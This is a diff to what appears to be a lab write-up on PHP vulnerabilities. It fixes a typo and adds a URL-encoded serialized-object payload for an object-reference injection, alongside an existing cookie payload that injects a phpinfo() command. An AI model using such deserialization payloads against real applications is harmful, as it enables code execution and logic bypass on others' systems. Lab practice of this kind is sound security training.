@@ -58,9 +58,12 @@ I coudn't upload a shell.
 
 ## 0x04 – PHP Object Injection(cookie)
 
-change cookie and inject php object as follows:  
+change cookie and inject php object as follow:  
 O%3A3%3A%22Foo%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%0D%0A
 
 ## 0x05 – PHP Object Injection(Object Reference)
 
+change request parameter input as follow:
+O%3A7%3A%22Object1%22%3A2%3A%7Bs%3A5%3A%22guess%22%3BN%3Bs%3A10%3A%22secretCode%22%3BR%3A2%3B%7D%0D%0A
 
+## 0x06 – PHAR Deserialization
